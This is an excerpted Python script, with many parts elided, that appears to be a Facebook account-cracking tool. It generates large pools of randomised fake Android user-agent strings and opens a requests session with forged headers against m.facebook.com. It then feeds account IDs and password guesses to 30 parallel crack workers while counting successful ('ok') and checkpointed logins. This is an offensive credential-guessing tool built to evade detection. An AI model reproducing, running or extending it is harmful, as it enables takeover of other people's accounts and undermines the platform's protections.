...
for xd in range(10000):
    ...
    b=random.choice(['5.0.1','6.0.1','7.0.1','8.0.1','9','10','11','12'])
    c='SAMSUNG SM-G532G)'
    d='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/'
    ...
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['5.0.1','6.0.1','7.0.1','8.0.1','9','10','11','12'])
    c='RMX1971 Build/RKQ1.201217.002; wv)'
    d='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/'
    e=random.randrange(73,100)
    f='0'
    g=random.randrange(4200,4900)
    h=random.randrange(40,150)
    ...
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['5.0.1','6.0.1','7.0.1','8.0.1','9','10','11','12'])
    c='SM-F700F Build/SP1A.210812.016; wv)'
    d='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/'
    e=random.randrange(73,100)
    f='0'
    g=random.randrange(4200,4900)
    h=random.randrange(40,150)
    i='Mobile Safari/537.36 Hawk/QuickBrowser/2.3.0.22166'
    uaku2=f'{aa}; {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['5.0','6.0','7.0','8.0','9.0','10','11','12'])
    c='LG-H815 Build/MRA58K; wv)'
    d='AppleWebKit/547.36 (KHTML, like Gecko) Chrome/'
    e=random.randrange(73,200)
    f='0'
    g=random.randrange(4200,4900)
    h=random.randrange(40,150)
    i='Mobile Safari/547.36 [FB_IAB/FB4A;FBAV/248.1.1.64.121;]'
    uaku2=f'{aa} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['5.0.1','6.0.1','7.0.1','8.0.1','9.0.1','10','11','12','13'])
    c='LG-D802TR Build/KOT49I.D802TR20c)'
    d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    e=random.randrange(73,100)
    f='0'
    g=random.randrange(4200,4900)
    h=random.randrange(40,150)
    i='Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/403.1.0.17.106;]'
    uaku2=f'{aa} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['5.0.1','6.0.1','7.0.1','8.0.1','9.0.1','10','11','12','13'])
    c='ASUS_I005DA Build/SKQ1.210821.001; wv)'
    d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    e=random.randrange(73,100)
    f='0'
    g=random.randrange(4200,4900)
...
#User Agnes buatan Asep Yusup 
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android {str(rr(5,12))}; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(5,12))}; Redmi Note 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android {str(rr(5,12))}; Redmi Note 5 Build/SP1A.{str(rr(100000,200000))}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    empat  = f"Mozilla/5.0 (Linux; Android {str(rr(5,12))}; Moto X40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    lima  = f"Mozilla/5.0 (Linux; Android {str(rr(5,12))}; en-us; Redmi 5 Plus Build/OPM1.{str(rr(100000,200000))}.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    enam = f"Mozilla/5.0 (Linux; U; Android {str(rr(5,12))}; en-US; ASUS_Z00AD Build/LRX21V) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/{str(rr(1,12))}.{str(rr(1,12))}.{str(rr(1,12))}.{str(rr(400,600))} U3/0.{str(rr(1,12))}.0 Mobile Safari/534.30"
    tujuh = f"Mozilla/5.0 (Linux; U; Android {str(rr(5,12))}; ar-eg; Mi A{str(rr(5,12))} Build/RKQ1.{str(rr(100000,200000))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36 PHX/12.3"
    uaku2 = str(rc([satu,dua,tiga,empat,lima,enam,tujuh]))
    ugen.append(uaku2)
try:
...
def banner():
	clear()
	rfn_23(f"""{m}####################################
{m}# RECODER SCRIPT BY : XYBORGLOGICXV. 🔥⠀⠀⠀⠀⠀
{m}#⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⡿⠿⠿⠿⠿⢿⣿⣿⣷⣦⣄⣀⣤⣶⣶
{m}#⠀⠀⠀⠀⠀⣰⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⠟⠋
{m}#⠀⠀⠀⠀⣼⣿⡿⠃⠀⢀⣤⣾⣿⣿⣿⣿⣷⣦⣄⠀⠀⠈⠉⠀⠀⠀
{m}#⠀⠀⠀⣸⣿⡿⠁⠀⢠⣿⣿⠟⠉⠀⠈⠉⠛⢿⣿⣷⡄⠀⠀⠀⠀⠀
	...
	try:
		...
		with requests.Session() as r:
			try:
				...
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			elif 'tiktod' in method:
				pool.submit(cracktiktod,idf,pwv)
			else:
				pool.submit(cracktiktod,idf,pwv)
	print('')
	print('='*51)
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\rXYBORG {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
